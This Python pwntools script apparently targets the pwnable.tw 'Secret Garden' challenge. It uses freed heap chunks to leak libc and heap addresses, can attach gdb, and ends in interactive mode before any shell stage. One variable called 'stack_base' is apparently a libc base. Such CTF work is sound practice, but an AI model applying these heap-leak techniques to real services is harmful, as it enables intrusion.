#!/usr/bin/env python3

import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

if pwn.args['LOCAL']:
	io = pwn.process('./secretgarden', env = {'LD_PRELOAD': './libc_64.so.6'})
else:
	io = pwn.remote('chall.pwnable.tw', 10203)

libc = pwn.ELF('./libc_64.so.6')

def raise_flower(length, name, color):
	io.recvuntil(b'Your choice : ')
	io.sendline(b'1')
	io.recvuntil(b'Length of the name :')
	io.sendline(str(length))
	io.recvuntil(b'The name of flower :')
	io.send(name)
	io.recvuntil(b'The color of the flower :')
	io.sendline(color)
	io.recvuntil(b'Successful !\n')

def visit():
	io.recvuntil(b'Your choice : ')
	io.sendline(b'2')
	return io.recvuntil('â˜†', drop = True)
	

def remove_flower(index):
	io.recvuntil(b'Your choice : ')
	io.sendline(b'3')
	io.recvuntil(b'Which flower do you want to remove from the garden:')
	io.sendline(str(index))


raise_flower(0xb0, b'A' * 0x38, b'0' * 23)
raise_flower(0xb0, b'B' * 0x38, b'1' * 23)

remove_flower(0)

raise_flower(128, b'\n', b'0' * 23)

leak = visit().split(b':')[3][0:6]
stack_leak = pwn.u64(leak.ljust(8, b'\0'))
stack_base = stack_leak - 3951370

print('stack_base', hex(stack_base))

raise_flower(0x18, b'A' * 0x48, b'0' * 23)
raise_flower(0x18, b'B' * 0x48, b'0' * 23)
raise_flower(0x18, b'C' * 0x48, b'0' * 23)
remove_flower(3)
remove_flower(4)
raise_flower(0x18, b'\n', b'0' * 23)

leak = visit().split(b':')[7][0:6]
heap_leak = pwn.u64(leak.ljust(8, b'\0'))
heap_base = heap_leak - 4618
print('heap_leak', hex(heap_leak))
print('heap_base', hex(heap_base))

#for _ in range(6, 50):
#	raise_flower(0x58, b'A' * 58, b'0' * 23)


if pwn.args['GDB']:
	pwn.gdb.attach(io, '''
		set env LD_PRELOAD=./libc_64.so.6
		set disassembly-flavor intel
		layout asm
		focus cmd
	''')


io.interactive()

